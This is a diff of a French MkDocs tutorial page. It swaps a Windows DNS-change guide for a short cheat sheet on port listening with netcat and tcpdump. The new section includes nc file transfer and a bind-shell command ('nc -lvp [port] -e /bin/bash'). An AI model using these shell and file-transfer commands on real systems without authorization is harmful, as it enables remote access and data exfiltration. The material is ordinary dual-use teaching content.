@@ -3,18 +3,18 @@
 <head>
     <meta charset="utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="canonical" href="https://cyber-puit-de-connaissances.com/changer_DNS_windows/" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="canonical" href="https://cyber-puit-de-connaissances.com/Ecoute_ports/" />
       <link rel="shortcut icon" href="../img/favicon.ico" />
-    <title>Changer DNS - Cyber-puit de connaissances</title>
+    <title>Ecoute de ports - Cyber-puit de connaissances</title>
     <link rel="stylesheet" href="../css/theme.css" />
     <link rel="stylesheet" href="../css/theme_extra.css" />
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
     
       <script>
         // Current page data
-        var mkdocs_page_name = "Changer DNS";
-        var mkdocs_page_input_path = "changer_DNS_windows.md";
-        var mkdocs_page_url = "/changer_DNS_windows/";
+        var mkdocs_page_name = "Ecoute de ports";
+        var mkdocs_page_input_path = "Ecoute_ports.md";
+        var mkdocs_page_url = "/Ecoute_ports/";
       </script>
     
     <script src="../js/jquery-3.6.0.min.js" defer></script>
@@ -45,8 +45,28 @@
                 </li>
               </ul>
               <p class="caption"><span class="caption-text">Utile</span></p>
-              <ul>
-                  <li class="toctree-l1"><a class="reference internal" href="../Ecoute_ports/">Ecoute de ports</a>
+              <ul class="current">
+                  <li class="toctree-l1 current"><a class="reference internal current" href="./">Ecoute de ports</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#methode-netcat">Méthode NETCAT</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#exemple-ecouter-un-port-udp">Exemple : Ecouter un port UDP</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#methode-tcpdump">Méthode TCPDUMP</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#exemple-ecouter-un-port-pour-une-requete-icmp">Exemple : Ecouter un port pour une requête ICMP</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#envoyer-un-fichier">Envoyer un fichier</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#recuperer-un-fichier">Récupérer un fichier</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#recuperer-un-shell">Récupérer un shell</a>
+    </li>
+    </ul>
                   </li>
               </ul>
               <p class="caption"><span class="caption-text">Outils</span></p>
@@ -78,24 +98,8 @@
                   </li>
               </ul>
               <p class="caption"><span class="caption-text">Réseau</span></p>
-              <ul class="current">
-                  <li class="toctree-l1 current"><a class="reference internal current" href="./">Changer DNS</a>
-    <ul class="current">
-    <li class="toctree-l2"><a class="reference internal" href="#connaitre-son-dns-actuel">Connaitre son DNS actuel</a>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#en-utilisant-le-cmd">En utilisant le cmd</a>
-        <ul>
-    <li class="toctree-l3"><a class="reference internal" href="#ipv4">IPv4</a>
-    </li>
-    <li class="toctree-l3"><a class="reference internal" href="#ipv6">IPv6</a>
-    </li>
-    <li class="toctree-l3"><a class="reference internal" href="#connaitre-le-dns-dune-interface-reseau-particuliere-pour-un-protocole-particulier">Connaitre le DNS d'une interface réseau particulière pour un protocole particulier</a>
-    </li>
-        </ul>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#remettre-le-dns-de-base">Remettre le DNS de base</a>
-    </li>
-    </ul>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../changer_DNS_windows/">Changer DNS</a>
                   </li>
               </ul>
               <p class="caption"><span class="caption-text">Système</span></p>
@@ -127,8 +131,8 @@
         <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
   <ul class="wy-breadcrumbs">
     <li><a href=".." class="icon icon-home" aria-label="Docs"></a> &raquo;</li>
-          <li>Réseau &raquo;</li>
-      <li>Changer DNS</li>
+          <li>Utile &raquo;</li>
+      <li>Ecoute de ports</li>
     <li class="wy-breadcrumbs-aside">
     </li>
   </ul>
@@ -137,45 +141,123 @@
           <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
             <div class="section" itemprop="articleBody">
               
-                <h1 id="changement-de-dns-windows">Changement de DNS windows</h1>
-<h2 id="connaitre-son-dns-actuel">Connaitre son DNS actuel</h2>
-<pre><code class="language-cmd">ipconfig /all | findstr &quot;Server DNS&quot;
+                <h1 id="lecoute-de-ports">L'écoute de ports</h1>
+<h2 id="methode-netcat">Méthode NETCAT</h2>
+<p>Pour écouter un port on peut utiliser la commande :</p>
+<pre><code class="language-bash">nc -lvp [port]
 </code></pre>
-<p>Pour trouver le DNS rapidement. 
-Personnellement ça me met l'IP de ma box ce qui est normal car mes requêtes sont envoyées à ma box qui renvoie vers le DNS de son choix et ça ça me plait pas. </p>
-<h2 id="en-utilisant-le-cmd">En utilisant le cmd</h2>
-<p>Connaitre le nom de l'interface réseau pour laquelle on va changer le DNS</p>
-<pre><code class="language-bash">netsh interface show interface
+<ul>
+<li>TAG | Description</li>
+<li>--- | ---</li>
+<li><code>-l</code> | Ecouter</li>
+<li><code>-v</code> | Verbose</li>
+<li><code>-p</code> | Port</li>
+</ul>
+<p>On peut aussi écouté un port TCP ou UDP en rajoutant <code>-u</code> ou <code>-t</code>.</p>
+<h4 id="exemple-ecouter-un-port-udp">Exemple : Ecouter un port UDP</h4>
+<p>Pour écouter un port UDP on peut utiliser la commande :</p>
+<pre><code class="language-bash">nc -l -u -p [port]
 </code></pre>
-<p>Personnellement c'est Ethernet</p>
-<p>Du coup on va changer le serveur DNS du protocol IPv4 et IPv6 séparément. </p>
-<h3 id="ipv4">IPv4</h3>
-<p>Je commence par IPv4 et je vais mettre le DNS public google : <em>8.8.8.8</em>  (principal) et <em>8.8.4.4</em> (secoure), on va le faire en deux fois :</p>
-<p>/!\ il faut lancer le terminal en administrateur</p>
-<pre><code class="language-bash">netsh interface ipv4 set dnsservers &quot;Nom interface réseau&quot; static [Adresse IP du serveur DNS primaire] primary
+<h2 id="methode-tcpdump">Méthode TCPDUMP</h2>
+<p>Pour écouter un port on peut utiliser la commande :</p>
+<pre><code class="language-bash">sudo tcpdump port [port]
 </code></pre>
-<pre><code class="language-bash">netsh interface ipv4 add dnsservers &quot;Nom interface réseau&quot; [Adresse IP du serveur DNS secondaire] index=2
+<table>
+<thead>
+<tr>
+<th>TAG</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>port</code></td>
+<td>Filtre port</td>
+</tr>
+</tbody>
+</table>
+<h4 id="exemple-ecouter-un-port-pour-une-requete-icmp">Exemple : Ecouter un port pour une requête ICMP</h4>
+<p>Pour écouter les requêtes ICMP on peut utiliser la commande :</p>
+<pre><code class="language-bash">sudo tcpdump ip proto \\icmp -i tun0
 </code></pre>
-<h3 id="ipv6">IPv6</h3>
-<p>C'est la même chose mais avec des adresses IPv6 : <em>2001:4860:4860::8888</em> (principale sur le port 8888) et secondaire : <em>2001:4860:4860::8844</em></p>
-<pre><code class="language-bash">netsh interface ipv6 set dnsservers &quot;Nom interface réseau&quot; static [Adresse IP du serveur DNS primaire] primary
+<table>
+<thead>
+<tr>
+<th>TAG</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ip proto \\icmp</code></td>
+<td>Filtre ICMP</td>
+</tr>
+<tr>
+<td><code>-i</code></td>
+<td>Interface</td>
+</tr>
+</tbody>
+</table>
+<h2 id="envoyer-un-fichier">Envoyer un fichier</h2>
+<p>Pour envoyer un fichier on peut utiliser la commande :</p>
+<pre><code class="language-bash">nc [ip] [port] &lt; [fichier]
 </code></pre>
-<pre><code class="language-bash">netsh interface ipv6 add dnsservers &quot;Nom interface réseau&quot; [Adresse IP du serveur DNS secondaire] index=2
+<table>
+<thead>
+<tr>
+<th>TAG</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&lt;</code></td>
+<td>Redirection</td>
+</tr>
+</tbody>
+</table>
+<h2 id="recuperer-un-fichier">Récupérer un fichier</h2>
+<p>Pour récupérer un fichier on peut utiliser la commande :</p>
+<pre><code class="language-bash">nc -lvp [port] &gt; [fichier]
 </code></pre>
-<p>On peut vérifier que ça a bien marché : </p>
-<h3 id="connaitre-le-dns-dune-interface-reseau-particuliere-pour-un-protocole-particulier">Connaitre le DNS d'une interface réseau particulière pour un protocole particulier</h3>
-<pre><code class="language-bash">netsh interface Nom_protocole show dnsservers &quot;Nom interface&quot;
+<table>
+<thead>
+<tr>
+<th>TAG</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&gt;</code></td>
+<td>Redirection</td>
+</tr>
+</tbody>
+</table>
+<h2 id="recuperer-un-shell">Récupérer un shell</h2>
+<p>Pour récupérer un shell on peut utiliser la commande :</p>
+<pre><code class="language-bash">nc -lvp [port] -e /bin/bash
 </code></pre>
-<h2 id="remettre-le-dns-de-base">Remettre le DNS de base</h2>
-<p>On peut réatribuer le DNS de base qui sera attribué automatiquement via le DHCP</p>
-<pre><code class="language-bash">netsh interface ipv4 set dnsservers &quot;Nom de l'interface réseau&quot; dhcp
-</code></pre>
+<table>
+<thead>
+<tr>
+<th>TAG</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-e</code></td>
+<td>Executer</td>
+</tr>
+</tbody>
+</table>
               
             </div>
           </div><footer>
     <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
-        <a href="../SMB_exploit_bases/" class="btn btn-neutral float-left" title="Les bases de l'attaque sur SMB"><span class="icon icon-circle-arrow-left"></span> Previous</a>
-        <a href="../reset_mdp_BIOS_hardware_PC_fixe/" class="btn btn-neutral float-right" title="PC fixe">Next <span class="icon icon-circle-arrow-right"></span></a>
+        <a href="../accueil/" class="btn btn-neutral float-left" title="Accueil"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../nmap_bases_scan/" class="btn btn-neutral float-right" title="Les scans">Next <span class="icon icon-circle-arrow-right"></span></a>
     </div>
 
   <hr/>
@@ -198,10 +280,10 @@ Personnellement ça me met l'IP de ma box ce qui est normal car mes requêtes so
   <span class="rst-current-version" data-toggle="rst-current-version">
     
     
-      <span><a href="../SMB_exploit_bases/" style="color: #fcfcfc">&laquo; Previous</a></span>
+      <span><a href="../accueil/" style="color: #fcfcfc">&laquo; Previous</a></span>
     
     
-      <span><a href="../reset_mdp_BIOS_hardware_PC_fixe/" style="color: #fcfcfc">Next &raquo;</a></span>
+      <span><a href="../nmap_bases_scan/" style="color: #fcfcfc">Next &raquo;</a></span>
     
   </span>
 </div>
